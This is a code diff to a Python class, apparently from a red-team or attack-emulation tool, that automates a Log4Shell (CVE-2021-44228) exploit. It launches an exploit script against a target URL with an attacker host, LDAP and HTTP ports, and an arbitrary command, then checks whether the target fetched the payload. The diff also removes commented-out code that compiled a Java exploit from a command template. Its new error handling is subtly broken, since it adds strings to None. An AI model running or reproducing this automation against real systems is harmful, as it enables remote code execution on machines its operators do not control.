@@ -2,6 +2,7 @@ import os
 import string
 import random
 import subprocess
+import time as t
 from pathlib import Path
 from shutil import copyfile, rmtree
 
@@ -348,15 +349,9 @@ class Trainman:
         subprocess.Popen(
             jvm_install_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env
         )
-        env['JAVA_HOME'] = '/root/.jabba/jdk/adopt@1.8.0-292'
-        #with open('/L4sh/db/template.java', 'r') as template:
-        #    exploit_code = template.read().replace('CMDGOSHERE', exec_cmd)
-        #with open('/tmp/Main.java', 'w') as temp_java:
-        #    temp_java.write(exploit_code)
-        #build_exploit_cmd = ['/root/.jabba/jdk/adopt@1.8.0-292/bin/javac', '/tmp/Main.java']
-        #subprocess.Popen(
-        #    build_exploit_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env
-        #)
+        os.environ['JAVA_HOME'] = '/root/.jabba/jdk/adopt@1.8.0-292'
+        os.environ['PATH'] = os.environ['PATH'] + ':/root/.jabba/jdk/adopt@1.8.0-292/bin'
+        env.update(os.environ)
         exploit_cve_2021_44228_cmd = [
             f'python3 main.py -i {self.host_info[2]} -u {target_url} -c {exec_cmd} -p {http_port} -l {ldap_port}'
         ]
@@ -370,7 +365,7 @@ class Trainman:
             cwd=r'/L4sh'
         )
         if exploit_cve_2021_44228.stdout:
-            counter = 1
+            timeout = t.time() + 10
             output = None
             for exploit_line in exploit_cve_2021_44228.stdout:
                 if b'New HTTP Request 200' in exploit_line:
@@ -380,19 +375,22 @@ class Trainman:
                         'forward_log': 'True'
                     }
                     break
-                if not output and counter == 25:
+                if not output and t.time() > timeout:
                     output = {
                         'outcome': 'failed',
                         'message': 'exploit_cve_2021_44228 executed but failed to exploit target',
                         'forward_log': 'True'
                     }
                     break
-                counter += 1
+                t.sleep(1)
             exploit_cve_2021_44228.terminate()
         else:
+            message = None
+            for line in exploit_cve_2021_44228.stderr:
+                message = message + line.decode('ascii')
             output = {
                 'outcome': 'failed',
-                'message': exploit_cve_2021_44228.stderr,
+                'message': message,
                 'forward_log': 'True'
             }
             exploit_cve_2021_44228.terminate()
